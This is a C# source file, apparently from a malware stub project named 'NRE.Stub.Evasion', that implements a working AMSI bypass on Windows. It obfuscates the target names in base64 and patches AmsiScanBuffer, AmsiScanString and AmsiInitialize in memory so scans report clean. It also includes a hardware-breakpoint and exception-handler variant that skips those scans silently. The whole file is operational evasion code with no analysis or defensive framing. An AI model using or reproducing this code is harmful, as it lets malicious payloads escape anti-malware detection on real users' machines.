using System;
using System.Runtime.InteropServices;
using System.Threading;
using NRE.Core.Common;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// AMSI bypass: optional Hardware Breakpoint (HBP) + fallback memory patch.
    /// </summary>
    public static class AmsiPatch
    {
        private static IntPtr _vehHandle;
        private static IntPtr _amsiScanBufferAddr;
        private static IntPtr _amsiScanStringAddr;
        private static readonly object _lock = new object();
        private static bool _useHbp;

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private delegate uint VectoredExceptionHandlerDelegate(IntPtr pExceptionPointers);
        private static readonly VectoredExceptionHandlerDelegate _vehHandler = VehHandler;

        public static void Patch(bool useHardwareBreakpoint = false)
        {
            lock (_lock)
            {
                string amsiName = RuntimeStrings.Decode("YW1zaS5kbGw=");
                IntPtr amsi = LoadLibrary(amsiName);
                if (amsi == IntPtr.Zero) return;

                string scanBufName = RuntimeStrings.Decode("QW1zaVNjYW5CdWZmZXI=");
                string scanStrName = RuntimeStrings.Decode("QW1zaVNjYW5TdHJpbmc=");
                IntPtr scanBuf = GetProcAddress(amsi, scanBufName);
                IntPtr scanStr = GetProcAddress(amsi, scanStrName);
                if (scanBuf == IntPtr.Zero && scanStr == IntPtr.Zero) return;

                _amsiScanBufferAddr = scanBuf;
                _amsiScanStringAddr = scanStr;
                _useHbp = useHardwareBreakpoint;

                if (useHardwareBreakpoint && InstallHbpBypass())
                    return;

                if (scanBuf != IntPtr.Zero)
                    PatchFunction(scanBuf);
                if (scanStr != IntPtr.Zero)
                    PatchFunction(scanStr);

                string initName = RuntimeStrings.Decode("QW1zaUluaXRpYWxpemU=");
                IntPtr initAddr = GetProcAddress(amsi, initName);
                if (initAddr != IntPtr.Zero)
                    PatchAmsiInitialize(initAddr);
            }
        }

        private static void PatchFunction(IntPtr addr)
        {
            byte[] patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 };
            uint oldProt;
            if (!NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProt))
                return;
            try
            {
                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            finally
            {
                NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
            }
        }

        private static void PatchAmsiInitialize(IntPtr addr)
        {
            byte[] patch = new byte[] { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 };
            uint oldProt;
            if (!NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProt))
                return;
            try
            {
                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            finally
            {
                NativeMethods.VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
            }
        }

        private static bool InstallHbpBypass()
        {
            if (_amsiScanBufferAddr == IntPtr.Zero) return false;
            _vehHandle = NativeMethods.AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehHandler));
            if (_vehHandle == IntPtr.Zero) return false;

            uint mainTid = NativeMethods.GetCurrentThreadId();
            var helper = new Thread(() => SetHardwareBreakpoints(mainTid));
            helper.IsBackground = true;
            helper.Start();
            helper.Join(2000);
            return true;
        }

        private static void SetHardwareBreakpoints(uint mainThreadId)
        {
            IntPtr hThread = NativeMethods.OpenThread(
                NativeMethods.THREAD_SUSPEND_RESUME | NativeMethods.THREAD_GET_CONTEXT | NativeMethods.THREAD_SET_CONTEXT,
                false, mainThreadId);
            if (hThread == IntPtr.Zero) return;
            try
            {
                if (NativeMethods.SuspendThread(hThread) == unchecked((uint)-1)) return;
                IntPtr ctxBuf = Marshal.AllocHGlobal(ContextOffsets.Size);
                try
                {
                    Marshal.WriteInt32(ctxBuf, ContextOffsets.OffsetContextFlags, (int)(NativeMethods.CONTEXT_CONTROL | NativeMethods.CONTEXT_DEBUG_REGISTERS));
                    if (!NativeMethods.GetThreadContext(hThread, ctxBuf))
                    {
                        NativeMethods.ResumeThread(hThread);
                        return;
                    }
                    Marshal.WriteInt64(ctxBuf, ContextOffsets.OffsetDr0, _amsiScanBufferAddr.ToInt64());
                    if (_amsiScanStringAddr != IntPtr.Zero)
                        Marshal.WriteInt64(ctxBuf, ContextOffsets.OffsetDr1, _amsiScanStringAddr.ToInt64());
                    Marshal.WriteInt64(ctxBuf, ContextOffsets.OffsetDr7, 0x03);
                    if (!NativeMethods.SetThreadContext(hThread, ctxBuf))
                    {
                        NativeMethods.ResumeThread(hThread);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ctxBuf);
                }
                NativeMethods.ResumeThread(hThread);
            }
            finally
            {
                NativeMethods.CloseHandle(hThread);
            }
        }

        private static uint VehHandler(IntPtr pExceptionPointers)
        {
            if (pExceptionPointers == IntPtr.Zero) return NativeMethods.EXCEPTION_CONTINUE_SEARCH;
            IntPtr ctxPtr = Marshal.ReadIntPtr(pExceptionPointers, IntPtr.Size);
            IntPtr exRecPtr = Marshal.ReadIntPtr(pExceptionPointers);
            if (ctxPtr == IntPtr.Zero || exRecPtr == IntPtr.Zero) return NativeMethods.EXCEPTION_CONTINUE_SEARCH;

            uint code = (uint)Marshal.ReadInt32(exRecPtr);
            if (code != NativeMethods.STATUS_SINGLE_STEP) return NativeMethods.EXCEPTION_CONTINUE_SEARCH;

            IntPtr exceptionAddr = Marshal.ReadIntPtr(exRecPtr, 24);
            if (exceptionAddr != _amsiScanBufferAddr && exceptionAddr != _amsiScanStringAddr)
                return NativeMethods.EXCEPTION_CONTINUE_SEARCH;

            long rsp = Marshal.ReadInt64(ctxPtr, ContextOffsets.OffsetRsp);
            long returnAddr = Marshal.ReadInt64((IntPtr)rsp);
            long resultPtrVal = Marshal.ReadInt64((IntPtr)(rsp + 0x20));
            if (resultPtrVal != 0)
                Marshal.WriteInt32((IntPtr)resultPtrVal, 0);
            Marshal.WriteInt64(ctxPtr, ContextOffsets.OffsetRip, returnAddr);
            Marshal.WriteInt64(ctxPtr, ContextOffsets.OffsetRsp, rsp + 8);
            return NativeMethods.EXCEPTION_CONTINUE_EXECUTION;
        }
    }
}
